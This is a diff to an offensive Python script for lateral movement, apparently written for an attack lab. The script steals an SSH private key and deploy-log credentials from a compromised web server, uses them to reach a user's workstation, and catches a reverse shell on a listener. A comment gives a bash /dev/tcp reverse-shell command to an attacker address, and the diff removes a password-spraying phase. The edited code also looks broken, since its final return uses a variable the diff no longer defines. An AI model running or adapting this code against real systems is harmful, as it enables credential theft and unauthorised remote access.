@@ -5,6 +5,8 @@ import socket
 import threading
 import time
 
+from chainlog import log
+
 # =============================================================================
 # lateral_movement.py — Noisy Failed Attempts + Successful Lateral Movement
 # MITRE ATT&CK:
@@ -351,61 +353,48 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
             failed_lateral_key_failures     — IPs where key auth was denied
             failed_lateral_password_failures — (ip, pwd) pairs that were denied
     """
-    print("\n[*] Starting lateral movement phase...")
+    log("\n[*] Starting lateral movement to workstation...")
 
     # ------------------------------------------------------------------
     # Phase 1 — Credential discovery: deploy.log + private key on apache
     # ------------------------------------------------------------------
     if workstation_ip is not None:
-        print(f"[+] Using workstation IP from prior step: {workstation_user}@{workstation_ip}")
+        log(f"[+] Using workstation IP from prior step: {workstation_user}@{workstation_ip}")
     else:
-        workstation_ip = WORKSTATION_IP
-        workstation_ip, workstation_user = _discover_workstation(
-            root_shell, workstation_ip, workstation_user
-        )
+        workstation_ip = WORKSTATION_IP   # set fallback before possible override below
+        log(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
+        log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
 
-    print(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
+        match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
+        if match:
+            workstation_user = match.group(1)
+            workstation_ip   = match.group(2)
+            log(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
+        else:
+            log(f"[!] Could not parse deploy.log; using defaults "
+                  f"({workstation_user}@{workstation_ip})")
+
+    log(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
     raw_key = _run_remote(root_shell, f"cat {REMOTE_KEY_PATH}", timeout=10)
 
     key_start = raw_key.find("-----BEGIN OPENSSH PRIVATE KEY-----")
     key_end   = raw_key.find("-----END OPENSSH PRIVATE KEY-----")
     if key_start < 0 or key_end < 0:
-        print(f"[-] Private key not found at {REMOTE_KEY_PATH}")
-        return {"john_shell": None, **_EMPTY_FAILED}
+        log(f"[-] Private key not found at {REMOTE_KEY_PATH}")
+        return None
     key_text = raw_key[key_start:key_end + len("-----END OPENSSH PRIVATE KEY-----")] + "\n"
-    print("[+] Deploy key retrieved")
+    log("[+] Deploy key retrieved")
 
-    print(f"[*] Staging key at {STAGED_KEY_PATH} on apache...")
+    # ------------------------------------------------------------------
+    # Phase 2 — Stage key on apache, pre-verify SSH connectivity
+    # ------------------------------------------------------------------
+    log(f"[*] Staging key at {STAGED_KEY_PATH} on apache...")
     if not _stage_key_on_apache(root_shell, key_text):
-        print("[-] Failed to stage deploy key on apache")
-        return {"john_shell": None, **_EMPTY_FAILED}
-    print("[+] Key staged successfully")
+        log("[-] Failed to stage deploy key on apache")
+        return None
+    log("[+] Key staged successfully")
 
-    # ------------------------------------------------------------------
-    # Phase 2 — Noisy failed attempts against non-john internal hosts
-    # ------------------------------------------------------------------
-    effective_john_ip = john_ip or workstation_ip
-    if other_targets:
-        spray_targets = [
-            ip for ip in other_targets
-            if ip != effective_john_ip and ip not in _SKIP_SPRAY
-        ]
-    else:
-        spray_targets = list(_FALLBACK_SPRAY_TARGETS)
-
-    if spray_targets:
-        print(f"\n[*] Phase 2 — failed lateral attempts on {len(spray_targets)} "
-              f"non-john host(s): {', '.join(spray_targets)}")
-        failed_result = _failed_attempts(root_shell, spray_targets,
-                                         workstation_user, workstation_port)
-    else:
-        print("[*] Phase 2 — no non-john targets discovered, skipping failed attempts")
-        failed_result = dict(_EMPTY_FAILED)
-
-    # ------------------------------------------------------------------
-    # Phase 3 — Verify SSH connectivity to john's workstation
-    # ------------------------------------------------------------------
-    print(f"\n[*] Phase 3 — pivoting to {workstation_user}@{workstation_ip}...")
+    log(f"[*] Verifying SSH connectivity to {workstation_user}@{workstation_ip}...")
     verify_out = _run_remote(
         root_shell,
         f"ssh -i {STAGED_KEY_PATH} "
@@ -417,16 +406,42 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
         timeout=15,
     )
     if "uid=" not in verify_out:
-        print(f"[-] SSH pre-check failed. Output: {verify_out!r}")
+        log(f"[-] SSH pre-check failed. Output: {verify_out!r}")
         send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
-        return {"john_shell": None, **failed_result}
-    print(f"[+] SSH pre-check passed: {verify_out.strip()}")
+        return None
+    log(f"[+] SSH pre-check passed: {verify_out.strip()}")
 
-    john_shell = _accept_john_shell(
-        root_shell, workstation_user, workstation_ip, workstation_port, kali_host
+    # ------------------------------------------------------------------
+    # Phase 3 — Set up listener and trigger reverse shell
+    # ------------------------------------------------------------------
+    john_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    john_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    john_server.bind(("0.0.0.0", PORT_JOHN))
+    john_server.listen(1)
+    log(f"[*] Waiting for john.stravidis shell on port {PORT_JOHN}...")
+
+    t = threading.Thread(
+        target=_fire_reverse_shell,
+        args=(root_shell, workstation_user, workstation_ip,
+              workstation_port, kali_host, PORT_JOHN),
+        daemon=True,
     )
-    if john_shell is None:
-        return {"john_shell": None, **failed_result}
+    t.start()
+
+    john_server.settimeout(20)
+    try:
+        john_shell, addr = john_server.accept()
+        log(f"[+] Shell received from {addr[0]}")
+    except socket.timeout:
+        log("[-] Timeout — no shell received from workstation")
+        log("    → check workstation can reach kali: route -n")
+        log(f"    → check ssh works manually: ssh -i {STAGED_KEY_PATH} "
+              f"{workstation_user}@{workstation_ip}")
+        send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
+        log(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
+        return None
+    finally:
+        john_server.close()
 
     # ------------------------------------------------------------------
     # Phase 4 — Confirm identity + clean up staged key
@@ -435,14 +450,14 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
     response = _read_id(john_shell)
 
     if "john.stravidis" in response:
-        print("[+] Lateral movement successful!")
-        print(f"[+] {response.strip()}")
+        log("[+] Lateral movement successful!")
+        log(f"[+] {response.strip()}")
     else:
-        print("[-] john.stravidis not confirmed in id output")
-        print(f"[?] Response: {response!r}")
+        log("[-] john.stravidis not confirmed in id output")
+        log(f"[?] Response: {response!r}")
 
     send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
-    print(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
+    log(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
 
     return {"john_shell": john_shell, **failed_result}
 
@@ -452,7 +467,7 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
 # Then in another terminal:
 #   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
 if __name__ == "__main__":
-    print("[*] Test mode — waiting for root shell on port 5555")
+    log("[*] Test mode — waiting for root shell on port 5555")
 
     test_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     test_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -461,11 +476,9 @@ if __name__ == "__main__":
 
     try:
         root_shell_sock, addr = test_server.accept()
-        print(f"[+] Root shell received from {addr[0]}")
+        log(f"[+] Root shell received from {addr[0]}")
     finally:
         test_server.close()
 
     result = run(root_shell_sock)
-    shell_ok = result["john_shell"] is not None
-    print(f"\n[*] Result: {'success — john.stravidis shell active' if shell_ok else 'failed'}")
-    print(f"[*] Failed-lateral targets: {result['failed_lateral_targets']}")
+    log(f"\n[*] Result: {'success — john.stravidis shell active' if result else 'failed'}")
